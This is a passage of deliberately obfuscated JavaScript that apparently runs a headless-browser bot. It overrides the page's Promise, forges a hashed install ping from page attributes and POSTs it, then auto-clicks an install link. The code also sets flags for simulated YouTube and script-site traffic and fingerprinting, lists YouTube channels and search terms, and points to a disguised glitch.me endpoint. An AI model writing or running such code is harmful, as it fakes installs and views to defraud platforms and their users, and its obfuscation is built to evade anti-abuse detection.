                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x67f + 0x5 * 0x655 + -0x2623 | L >>> -0x316 * 0x2 + -0x1733 + 0x1d7a) + (M & N | ~M & O) + P + (0x136ad * -0x3d59 + 0x5b8c0736 + 0x4969ad88) + Q[J] << -0x8ef * -0x2 + -0x1 * 0x1645 + 0x467) << 0x17e9 + -0x4b4 + -0x1330 | P >>> 0x1d76 + 0x1ee7 + 0x3 * -0x1416) + (L & (M = M << 0x23dd * -0x1 + 0x2f1 + 0x2 * 0x1085 | M >>> -0xe40 + -0x1579 + 0x23bb) | ~L & N) + O + (0x1c * 0x397242b + -0x6 * 0xd55ffd1 + 0x45fe83cb) + Q[J + (0x2454 + 0x18e6 + -0x3d39)] << 0xe22 + -0x2 * -0xb92 + 0x16f * -0x1a) << -0x10d1 + -0x2f * -0x4 + 0x80d * 0x2 | O >>> -0x266 + 0xe * 0x4f + 0x1f * -0xf) + (P & (L = L << -0x15b7 + -0x1c22 + 0x1 * 0x31f7 | L >>> 0x26ce + -0x1c5 * -0x5 + -0x2fa5) | ~P & M) + N + (-0x72f5de21 + -0x3abd0680 + 0x841aaf1d * 0x2) + Q[J + (-0x449 + -0xa * -0x65 + 0x59)] << -0x1a44 + 0x2120 + -0x6dc) << -0xc4b + -0x51a * 0x1 + 0x116a | N >>> -0x11f1 * 0x1 + 0x17be + -0x5b2) + (O & (P = P << -0x3 * -0x7f2 + -0x19c3 * 0x1 + 0x20b | P >>> 0x1d43 + -0xc4 * 0x18 + -0xae1) | ~O & L) + M + (-0x9dcbdcee + -0x11097063 * 0x3 + 0x12b6aa7b0) + Q[J + (-0xa49 * 0x2 + 0x5c * 0x5e + -0xd33)] << -0x1 * 0x125f + -0xa * 0x32d + 0x3221) << 0x1 * 0x25b1 + -0x475 * -0x7 + 0x44df * -0x1 | M >>> 0x660 + -0x1e40 + 0x17fb) + (N & (O = O << -0x2e7 * 0x7 + -0xcf0 + 0x215f | O >>> 0x9 * -0x6b + -0x1631 + 0x19f6) | ~N & P) + L + (0x65480399 + 0x390d4932 + -0x43d2d332) + Q[J + (0x4 * -0x4ea + -0x207a + 0x3426)] << -0x169f + 0x1199 * -0x2 + 0x39d1, N = N << -0x246c + -0x395 + 0x281f | N >>> -0xd03 + -0x45a * 0x4 + 0x1e6d;
              for (; J < 0x1c6a + 0x1be5 + -0x3827; J += -0x145 * 0xb + 0x1e0c + -0x1010)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x10 * 0x235 + -0x5 * -0x400 + 0xf55 | L >>> 0x2472 + 0x1953 + -0x3daa) + (M ^ N ^ O) + P + (0x1 * 0x1019ffb + 0x5c12d07f + -0x1dacb * -0x995) + Q[J] << -0x1050 + -0x43 * 0x50 + 0x2540) << 0x58 * 0x20 + -0x10f * 0xc + 0x93 * 0x3 | P >>> -0x1 * 0x1749 + -0x7cd * 0x4 + 0x3698) + (L ^ (M = M << 0x1c2c + 0x287 * 0x2 + 0xd * -0x28c | M >>> 0x2f1 + -0x13 * -0x115 + -0x2 * 0xbbf) ^ N) + O + (0x17 * 0x4650cf7 + 0x215 * 0x4091d7 + 0x7 * -0x11cf2075) + Q[J + (-0x1b * -0xd + 0x18ea + -0x1a48)] << -0x1817 + -0x2 * 0xa2a + 0x53 * 0x89) << -0xe18 + 0x1556 + -0x739 | O >>> -0x45 * 0x26 + 0x57a * -0x3 + 0x1c9 * 0xf) + (P ^ (L = L << 0x166c + 0xda * 0x9 + -0x1df8 | L >>> -0xa0d * 0x1 + -0x2422 + 0x2e31) ^ M) + N + (0x5982252a + 0x1 * 0x33731225 + 0x74c6f7 * -0x42) + Q[J + (0x2101 + -0x1273 * 0x1 + -0xe8c)] << 0x95 * 0x2b + 0x1b6e + -0x3475) << -0x1295 * 0x2 + -0x21 * -0x2b + 0x1fa4 | N >>> -0x59f + 0xf04 + -0x94a) + (O ^ (P = P << 0x2 * -0x115b + 0x9e8 + 0x18ec | P >>> -0x1651 + 0x15b4 + -0x3 * -0x35) ^ L) + M + (0xb1972cbc + -0x7d47cec4 + 0x3a8a8da9) + Q[J + (-0x1bd8 + 0x3e1 * -0x9 + 0x3ec4)] << 0x1a6 * -0x11 + 0x671 * 0x3 + 0x8b3) << -0x204b + 0x15cf + -0xa81 * -0x1 | M >>> -0x153a + 0x13 * -0x1d6 + 0x3837) + (N ^ (O = O << -0x1 * 0x8a9 + 0x3b4 + 0x513 | O >>> 0x26bb + 0x1830 + -0x1 * 0x3ee9) ^ P) + L + (-0xee907 * -0xa15 + 0x18829 * -0x5dbb + 0x11e631 * 0x5d1) + Q[J + (-0x9 * 0x21f + 0x2599 + -0x127e)] << 0x221 * -0x1 + -0x1d8b + 0x1 * 0x1fac, N = N << 0x1 * 0xa39 + 0xe0 + 0x3 * -0x3a9 | N >>> 0x1e4d + -0x2513 * 0x1 + 0x6c8;
              for (; J < 0x112f + 0x158a + -0x267d * 0x1; J += -0x223c + -0x22f * -0x5 + 0x3a * 0x67)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xd32 + 0x192e + 0x1 * -0x265b | L >>> 0x9ef * 0x1 + -0x1 * 0x260b + -0xe9 * -0x1f) + (M & N | M & O | N & O) + P - (-0x11 * 0x86c6dd6 + 0x1 * 0xb8d74afb + 0x4740435f) + Q[J] << 0x2273 + 0xe35 + -0x30a8) << -0xaa0 + 0x1f4 + 0x8b1 | P >>> 0x31 * -0x9a + -0x375 * 0x3 + 0x27f4) + (L & (M = M << -0xf * -0x7f + 0x1b42 + -0xd * 0x2a9 | M >>> 0x14b7 * 0x1 + -0x1d8 * -0x13 + 0x13 * -0x2ef) | L & N | M & N) + O - (-0xb8e76 * 0x38e + 0x1 * 0xec6876d + 0x8b32232b) + Q[J + (-0x1247 + -0x1752 + 0x299a)] << 0x69c + 0x2311 + -0x29ad) << -0x2 * -0xba1 + 0xc43 + -0x2380 | O >>> -0x3f1 * -0x2 + 0x1 * 0x26ba + 0x94d * -0x5) + (P & (L = L << 0x588 + -0x2188 + 0x76 * 0x3d | L >>> -0x7e * 0x4f + 0x2591 * 0x1 + -0x1 * -0x153) | P & M | L & M) + N - (-0x1dc6f * -0x3e6 + 0x8319319b + 0x1 * -0x19764731) + Q[J + (-0x3d0 + 0x133f + -0xf6d)] << 0x2269 + 0x344 * 0x6 + -0x7 * 0x7b7) << 0x79 * 0x21 + -0x41b + 0xb * -0x10b | N >>> 0x409 + 0x12 * -0xc5 + 0x5 * 0x1fc) + (O & (P = P << 0xcca + -0x4 * -0x37b + -0x1a98 | P >>> 0x8f3 * 0x3 + -0x14cd + -0x305 * 0x2) | O & L | P & L) + M - (0xb1a4d1 * 0x62 + 0x7c09 * 0x17ff + 0x2142cf2b * 0x1) + Q[J + (0x10b8 + 0x22c7 * -0x1 + -0x6 * -0x303)] << -0x10b * -0x6 + 0x5de + -0xc20) << -0x1 * 0xf31 + 0x1971 * 0x1 + 0x61 * -0x1b | M >>> 0x1 * 0xdd9 + 0xbef + -0x19ad) + (N & (O = O << -0x41 * 0x5b + -0x547 * -0x5 + -0x32a | O >>> -0x79 * 0x43 + -0x3ec * -0x6 + 0x825) | N & P | O & P) + L - (-0x79736896 + 0xf * -0xa08b937 + -0x17 * -0x10bb9685) + Q[J + (-0x2551 + -0x24a8 + 0x193 * 0x2f)] << -0x43 * -0x7d + -0xab6 * 0x1 + -0x1601, N = N << -0xd32 + -0xf6c + 0x4ca * 0x6 | N >>> -0x3 * -0x4de + -0x1875 + -0x65 * -0x19;
              for (; J < -0x2297 + 0x1cbe + 0x629; J += -0x1033 + 0x5 * 0x548 + -0xa30)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x115f + -0x1ba7 + 0xa4d | L >>> -0xbb1 + 0xa2b + 0x3 * 0x8b) + (M ^ N ^ O) + P - (-0x2d26 * 0x206ed + 0x55d * -0x126a6e + 0xf3e6be4e) + Q[J] << 0xf3 * -0x3 + 0x244d * 0x1 + -0x2174) << -0x1 * -0x114f + -0xb5c * -0x1 + -0x1ca6 | P >>> 0x55 + -0x25aa + 0x2570) + (L ^ (M = M << -0xfb3 * 0x2 + -0x81d + -0x5 * -0x7ed | M >>> 0x1986 + -0x1970 + -0x14) ^ N) + O - (0x3 * 0xfe915e6 + 0xee328e7 + 0x29e989 * -0x37) + Q[J + (0x7c9 * -0x1 + -0x12 * -0x155 + 0x25 * -0x70)] << -0x6fe + -0x24d2 + 0x2bd0) << 0xce9 * 0x1 + -0x206a + 0x31 * 0x66 | O >>> 0x2443 + -0x23be + -0x35 * 0x2) + (P ^ (L = L << 0x15b + 0x1 * -0xbef + 0xab2 | L >>> -0x201a + 0x22f4 * 0x1 + 0x38 * -0xd) ^ M) + N - (-0x52d0f9 * 0x16 + 0x7 * -0x9b7cbc3 + 0x3944d * 0x23f9) + Q[J + (0x24b2 + 0x18c9 + 0x3d79 * -0x1)] << -0x9 * -0xd9 + 0x1b94 + -0x1 * 0x2335) << -0x105 * 0x24 + 0xa6b + -0x206 * -0xd | N >>> 0x4 * 0x5b3 + 0x2014 + -0x36c5) + (O ^ (P = P << 0x1 * 0x1583 + 0x1 * 0x4d2 + -0x1a37 | P >>> 0x1a * -0x2c + 0x9f8 + -0x13 * 0x4a) ^ L) + M - (-0x5f8cc3bd + -0x384be4bc + 0xcd75e6a3) + Q[J + (-0x7 * -0xaf + 0xf27 + 0x13ed * -0x1)] << -0x120e + 0x130f + -0x101 * 0x1) << -0x1fc3 + 0x1a * 0x44 + -0x18e0 * -0x1 | M >>> -0x3 * -0x56f + 0x2b + -0x105d) + (N ^ (O = O << -0x8fe + 0x11a1 + -0x885 | O >>> 0x12b5 * 0x2 + -0xa2e + -0x1b3a) ^ P) + L - (-0x5888500d + 0x1ba8521a + 0x727d3c1d) + Q[J + (0xda * 0x23 + -0x5d2 * -0x6 + -0x40b6)] << -0x22f1 + 0x4c * -0x6f + -0xbf * -0x5b, N = N << 0x1fac * -0x1 + -0x1888 + -0x59 * -0xa2 | N >>> -0x3 * -0xcdc + 0x1657 + -0x3ce9;
              this['h0'] = this['h0'] + L << 0x1dfc + -0x176 * -0x1 + 0xfb9 * -0x2, this['h1'] = this['h1'] + M << 0x153f + 0x26b1 + 0x4 * -0xefc, this['h2'] = this['h2'] + N << -0xe82 * 0x1 + -0x1c39 + 0x2abb, this['h3'] = this['h3'] + O << 0xd92 + -0x124d * 0x1 + 0x4bb * 0x1, this['h4'] = this['h4'] + P << -0xa * -0x1 + 0x11d * -0x16 + 0x61d * 0x4;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x230 + 0x17f9 + -0x1f * 0xb3 & 0x1bf * -0x14 + 0x1 * 0x1a7d + -0x2 * -0x43f] + w[J >> -0x5 * -0x1d5 + 0xec6 + -0x11 * 0x167 & -0x52 * -0x12 + -0x2d * 0x4f + 0x6 * 0x15d] + w[J >> -0x3a1 + -0x1571 + 0x1926 & 0x2 * -0x1227 + 0x8 * -0x4b8 + 0x4a1d] + w[J >> 0x2350 + -0xb09 * -0x1 + 0x2e49 * -0x1 & -0x293 + -0xab6 + 0xd58] + w[J >> 0x1 * 0x755 + 0x2679 + -0x2dc2 * 0x1 & 0x270b + -0x9b5 + -0x1d47] + w[J >> 0x79c + 0x96 * 0x6 + 0x14 * -0x8e & 0x210f * -0x1 + -0x10d2 * -0x1 + -0xe * -0x12a] + w[J >> -0x37a * -0x4 + -0x3b7 * -0xa + -0x330a & 0xa * -0x29 + -0x1d7e + 0x1f27] + w[-0x1293 + 0x7c8 * 0x4 + 0x52 * -0x27 & J] + w[K >> -0x2 * -0x5d7 + 0xf9a + -0x1b2c & 0x104d * 0x2 + -0x175d + 0x2 * -0x497] + w[K >> -0x1dc1 * 0x1 + -0x5e8 + -0x23c1 * -0x1 & -0x79d + 0x5 * -0x291 + -0xb5 * -0x1d] + w[K >> 0x2631 + -0x12 * 0x1c0 + -0x69d & -0x10e5 + 0x12f7 + -0x203] + w[K >> -0x165e + 0x1bd * -0x3 + -0x937 * -0x3 & 0x290 + 0x155 * -0x1d + 0x2420] + w[K >> 0xcba + -0xa0e + -0x30 * 0xe & 0x1 * 0xe09 + -0x253a + 0x1740] + w[K >> -0x2146 + -0x24a + 0x2398 & 0x106 + 0x43a * -0x1 + 0xa7 * 0x5] + w[K >> -0x60 * -0x5b + -0x1e01 + -0x41b & -0x1156 + 0x1 * 0x434 + 0xd31] + w[0x1e96 + -0x865 + 0x1 * -0x1622 & K] + w[L >> 0x275 + 0x2095 + -0x22ee & -0x12 * -0x1eb + 0x10a9 + -0x3320] + w[L >> -0x1f75 + 0xdb8 + 0x11d5 & 0x8a9 * -0x1 + 0x56a + 0x34e] + w[L >> -0x651 + 0x2c5 * -0x2 + 0xbef & -0x1ee8 + 0x8c * -0x9 + 0x23e3] + w[L >> 0x179d + 0x7 * 0x4fa + -0x3a63 & -0x13 * 0x1ac + -0x3e8 * 0x8 + 0x3f13] + w[L >> 0x1d3 * -0x1 + -0x23e * 0xf + -0x95 * -0x3d & 0x3 * -0x398 + -0x60e + 0x361 * 0x5] + w[L >> 0x1 * -0xcfe + 0x1 * 0x19ef + 0x295 * -0x5 & -0x10e7 + 0x3 * -0x423 + 0x1d5f] + w[L >> -0x1c21 + -0x6e1 + 0x1 * 0x2306 & 0x1362 + -0x2705 + -0x1 * -0x13b2] + w[0x2127 + 0xcbd * 0x3 + -0x474f & L] + w[M >> -0x105 * -0x9 + -0x1 * -0x1209 + -0x1b1a & -0x1504 + -0x1 * -0x11d6 + 0x1 * 0x33d] + w[M >> 0x1ff5 + -0x1953 + 0x3e * -0x1b & -0x600 + -0x2214 + 0x1 * 0x2823] + w[M >> 0x871 + 0x1b24 + -0x95 * 0x3d & -0x1 * -0x9f3 + 0x1 * -0x1069 + -0x685 * -0x1] + w[M >> 0x6 * 0x49b + -0x1 * -0xe3a + -0x29cc & 0x5e * 0x27 + -0xb27 * 0x1 + -0x31c] + w[M >> 0x156d + 0x150c + 0x2a6d * -0x1 & 0x37c * 0x2 + 0x2 * 0xd7a + 0x1 * -0x21dd] + w[M >> -0x9a6 + -0x1 * -0x55c + 0x7 * 0x9e & 0x13a2 + -0x7 * 0x2b3 + -0xae] + w[M >> 0x110a + -0x691 * 0x1 + 0xa75 * -0x1 & -0x1e43 * -0x1 + -0xd7 * -0x10 + -0x2ba4] + w[0xd28 + -0x11e * -0xd + -0x1b9f & M] + w[N >> -0x196 * -0x5 + 0x1e * 0xd + 0x2e * -0x34 & 0x8 * -0x1a3 + -0x4a * -0x6b + -0x11c7] + w[N >> -0x1 * 0x2006 + 0xbc * 0x1b + 0x79 * 0x1a & -0x1a19 + 0x18a0 + 0x38 * 0x7] + w[N >> -0x1215 + -0x34e * 0xb + 0x3683 & -0x35e * -0x3 + -0x4 * -0x6d + -0xbbf] + w[N >> 0x88 * -0xc + -0x2bb + 0x92b & 0x108 * -0x2 + 0x1d1f + -0x9 * 0x300] + w[N >> -0x25de + 0x6 * -0x1b1 + 0x3010 & 0x14 * 0xe0 + 0xab0 + -0x1c21] + w[N >> -0x15d1 + -0xbc7 + 0x21a0 & -0x3 * 0x3ec + 0x525 * 0x2 + 0x189] + w[N >> 0xcf9 + 0x7 * 0x184 + -0x1791 & -0xb52 + 0xb32 + 0x1 * 0x2f] + w[0xe43 + -0x5f7 * 0x1 + -0x83d & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x112 * 0xd + -0xfee + -0x36 * -0xa & 0x37a + -0x1 * -0x16f + 0x1 * -0x3ea,
                J >> 0x1f77 + -0x167 * 0x3 + -0x1b32 & -0x3 * 0x5f6 + -0x1 * -0x12b8 + 0x1 * 0x29,
                J >> -0x2ba * -0x2 + -0x1876 + 0x1 * 0x130a & 0x94 * 0x4 + 0x1bc + 0xb * -0x47,
                -0xa8d * -0x1 + -0x26e8 + 0x1d5a & J,
                K >> -0x814 * 0x1 + -0x89 * 0x3f + 0x1 * 0x29e3 & -0x1 * -0x1029 + 0xd42 + -0x1c6c,
                K >> -0x3 * 0x9f0 + -0x2b * 0x1b + 0x1 * 0x2269 & -0x1f09 + -0x1f20 + -0x158 * -0x2f,
                K >> -0x10ee + -0xa46 + -0x7 * -0x3e4 & 0x48e + 0x1768 + -0x8fd * 0x3,
                -0x1 * 0x1159 + -0xb60 + 0x1db8 & K,
                L >> 0x132d * 0x1 + 0x1f * 0x40 + -0x1ad5 & -0x1be1 + -0x171 * -0xa + 0xe76 * 0x1,
                L >> 0x1 * 0xc85 + -0x17 * 0x66 + -0x34b & -0x2 * -0x98f + -0x3d3 * 0x1 + 0xa * -0x16e,
                L >> -0x1b15 * 0x1 + 0xde5 + 0x234 * 0x6 & 0x21e9 + 0x29 * -0xb3 + -0x43f * 0x1,
                -0x15d4 + 0x2e4 * -0xb + 0xb1 * 0x4f & L,
                M >> 0xd17 + 0x1 * -0x4e4 + -0x81b & 0x12ad + 0x16e1 + -0x288f,
                M >> -0x17ae + 0x2542 + -0xd84 & 0x1 * 0x4db + 0x9e9 + -0xdc5,
                M >> -0x1 * 0x1d9f + 0x16d0 + 0x11 * 0x67 & 0x1a70 + 0x2f3 + -0x5c * 0x4f,
                -0x1252 + 0x95a * 0x1 + 0x9f7 & M,
                N >> -0x34 * 0x8b + 0x20df + 0x48b * -0x1 & 0x1 * 0x1e73 + -0x18df * 0x1 + -0x495,
                N >> -0x1a2c + 0x1 * 0x1543 + 0x43 * 0x13 & -0x1bf9 + 0x998 * 0x2 + -0x4 * -0x272,
                N >> -0x2300 + 0x1535 + 0xdd3 & -0x8cc + 0x139a + 0x345 * -0x3,
                0x934 + 0x5 * 0x702 + -0x1 * 0x2b3f & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xa9 * 0x9 + -0x1a39 + 0x1 * 0x145c), (K = new DataView(J))['setUint32'](-0x15c3 + 0xfa9 + -0xb * -0x8e, this['h0']), K['setUint32'](0xfb5 + -0x59 * 0x8 + -0xce9 * 0x1, this['h1']), K['setUint32'](-0x1fab + -0x2 * 0xac1 + 0x3535, this['h2']), K['setUint32'](-0xac2 + -0xba2 + 0x59c * 0x4, this['h3']), K['setUint32'](-0x7c6 + 0x1b0f + -0x1339, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0xf8 * 0x1a + -0x371 * 0x1 + 0x1ca1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1ee1 + 0x1980 + -0x11 * 0x351;
            J[-0x7f8 + -0x1351 + 0x37 * 0x7f]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1 * -0x1b07 + -0x14c5 * 0x1 + -0x10a * -0x2e] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1dcf + 0x1 * -0x1d48 + -0x86), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x12bb + -0x2 * -0x1362 + -0x397e;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x5f * -0x4f + 0x49 * 0x56 + 0xaa7), Promise['resolve'](0x1 * 0x4df + 0x18bd * -0x1 + -0x1 * -0x13df);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r[T(0xc)](), i());
    }
  }
  for (let j = 0x91 * 0x15 + 0x12fc + -0xa4b * 0x3; j < -0x396 + 0x1fa * -0x9 + 0x1 * 0x1561; j++)
    i();
}
const NETWORK_PATIENCE = -0x1 * -0x1317 + 0xd9f * 0x4 + -0x2a53 + (-0x1d7b * 0x1 + 0x369 * -0xb + -0xd * -0x60e) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x44d + -0x9 * -0x3ac + -0xb1 * 0x36) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1 * 0x22af + 0x4a2 * -0x2 + 0x1b * -0xf1);
    let h = e[f];
    if (c['hkZNyW'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x621 + 0x1f69 + 0xa * -0x3c1, r, s, t = 0x12b7 + -0x845 * 0x1 + 0x539 * -0x2; s = m['charAt'](t++); ~s && (r = q % (-0x1a19 + -0x1f94 + 0x223 * 0x1b) ? r * (-0x9d8 + -0x6b * 0x52 + -0x162f * -0x2) + s : s, q++ % (-0x4a2 * 0x2 + -0x7 * -0x227 + -0x5c9)) ? o += String['fromCharCode'](0x1 * -0x181 + 0xc * -0x1a3 + 0xd * 0x1b4 & r >> (-(0x11b6 + -0x2 * -0x67 + 0x2e * -0x67) * q & -0x1d2 * 0xa + 0x31b * 0x7 + -0x383)) : 0x2388 + 0xa93 + -0x2e1b) {
          s = n['indexOf'](s);
        }
        for (let u = 0x8 * -0xd + -0x1b7b + 0xb * 0x289, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x47 * -0x1 + -0x444 + 0x40d))['slice'](-(-0x2172 * 0x1 + 0x1f1d + 0x1 * 0x257));
        }
        return decodeURIComponent(p);
      };
      c['cILjtK'] = i, b = arguments, c['hkZNyW'] = !![];
    }
    const j = e[-0xb7f + -0x288 + 0xe07],
      k = f + j,
      l = b[k];
    return !l ? (h = c['cILjtK'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x2084 + -0x1699 + 0x1 * -0x9eb; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const U = b;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f[U(0x4, 'BXrz')](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x8f5 * -0x4 + -0x1fc * -0x3 + 0x1dea)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x7d3 * 0x3 + -0xdf + -0x2 * 0xb48)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + 